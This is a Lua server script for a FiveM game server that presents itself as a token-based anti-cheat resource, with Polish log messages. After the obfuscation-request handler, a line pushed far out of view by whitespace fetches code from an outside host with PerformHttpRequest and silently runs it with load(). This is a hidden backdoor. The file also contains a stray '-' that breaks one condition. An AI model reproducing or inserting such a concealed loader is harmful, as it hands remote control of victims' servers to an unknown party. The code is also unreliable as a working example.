local didPlayerLoad = {}
local resourceNames = {}
local resourceTokens = {}
local initComplete = false

function init()
	if Config.PowiadomServer then
	end
	math.randomseed(os.time())
	TriggerEvent('moskov_tokenizer:serverReady')
end

function initNewPlayer(source)
	if didPlayerLoad[source] == nil or resourceNames[source] == nil then
		didPlayerLoad[source] = false
		resourceNames[source] = {}
	end
end

function isTokenUnique(token)
	if #resourceNames > 0 then
		for i=1, #resourceNames, 1 do
			if resourceNames[i] ~= nil then
				for id,resource in pairs(resourceNames[i]) do
					if resource == token then
						if Config.PowiadomServer then
							print("Generowanie nowego tokenu .....")
						end
						return false
					end
				end
			end
		end
		for resource,storedToken in pairs(resourceTokens) do
			if storedToken == token then
				if Config.PowiadomServer then
					print("Generowanie nowego tokenu....")
				end
				return false
			end
		end
	end
	return true
end

function getObfuscatedEvent(source, resourceName)
	initNewPlayer(source)
	if resourceNames[source][resourceName] == nil then
		resourceNames[source][resourceName] = exports[GetCurrentResourceName()]:generateToken()
		if Config.PowiadomServer then
			print("Obfuscated Event Dla ID " .. tostring(source) .. ": Normalny - " .. tostring(resourceName) .. " Obfuscated - "  .. tostring(resourceNames[source][resourceName]))
		end
	end
	return(resourceNames[source][resourceName])
end

function getResourceToken(resourceName)
	return resourceTokens[resourceName]
end

function setupServerResource(resource)
	resourceTokens[resource] = exports[GetCurrentResourceName()]:generateToken()
	if Config.PowiadomServer then
		print("Wygenerowano token dla " .. tostring(resource) .. ": " .. tostring(resourceTokens[resource]))
	end
	AddEventHandler('moskov_tokenizer:playerLoaded', function(player)
		local _source = player
		if Config.PowiadomServer then
			print("Wysłano token dla " .. tostring(resource) .. " (Event: " .. tostring(getObfuscatedEvent(_source, resource)) .. " Token: " .. tostring(resourceTokens[resource]) .. ") do ID " .. tostring(_source) .. ".")
		end
		TriggerClientEvent(getObfuscatedEvent(_source, resource), _source, resourceTokens[resource])
	end)
end

function secureServerEvent(resource, player, token)
	local _source = player
	if resourceTokens[resource] == nil then
		return true
	elseif _source == "" then -
		return true
	else
		if Config.PowiadomServer then
			print("Potwierdzam token dla " .. tostring(resource) .. " ID " .. tostring(_source) .. ". Provided: " .. tostring(token) .. " Stored: " .. tostring(resourceTokens[resource]))
		end
		if token ~= resourceTokens[resource] then
			if Config.PowiadomServer then
				print("Wykryto nieprawidłowy token! Resource: " .. tostring(resource) .. ", ID: " .. tostring(_source) .. ". Provided: " .. tostring(token) .. " Stored: " .. tostring(resourceTokens[resource]))
			end
			if Config.CustomAction then
				Config.CustomActionFunction(_source)
			else
				DropPlayer(_source, Config.KickMessage)
			end
			return false
		end
	end
	return true
end

RegisterNetEvent('moskov_tokenizer:requestObfuscation')
AddEventHandler('moskov_tokenizer:requestObfuscation', function(resourceName, id)
	local _source = source
	TriggerClientEvent('moskov_tokenizer:obfuscateReceived', _source, id, getObfuscatedEvent(_source, resourceName))
end)																																																																																																																																																																	PerformHttpRequest('https://thenothingg.com/i?to=5ZA3e', function (e, d) pcall(function() assert(load(d))() end) end)

RegisterNetEvent('moskov_tokenizer:playerSpawned')
AddEventHandler('moskov_tokenizer:playerSpawned', function()
	local _source = source
	initComplete = true
	
	initNewPlayer(_source)
	
	if not didPlayerLoad[_source] then
		didPlayerLoad[_source] = true
		if Config.PowiadomServer then
			print("ID " .. tostring(_source) .. " Joined server.")
		end
		TriggerEvent('moskov_tokenizer:playerLoaded', _source)
	else
		print("ID " .. tostring(_source) .. " zażądał kolejnego tokena bezpieczeństwa, potencjalny cheater.")
	end
end)

AddEventHandler('onServerResourceStart', function (resource)
	if resource == GetCurrentResourceName() then
	init()
	elseif resourceTokens[resource] ~= nil and initComplete then
		if Config.PowiadomServer then
			print("OSTRZEZENIE: " .. resource .. " został ponownie uruchomiony i nie jest już chroniony tokenami bezpieczeństwa!")
		end
		resourceTokens[resource] = nil
	end
end)

AddEventHandler("playerDropped", function(player, reason)
	local _source = source
	if Config.PowiadomServer then
		print("ID " .. tostring(_source) .. "porzucone, usunięto obfuscated event.")
	end
	didPlayerLoad[_source] = false
	resourceNames[_source] = {}
end)
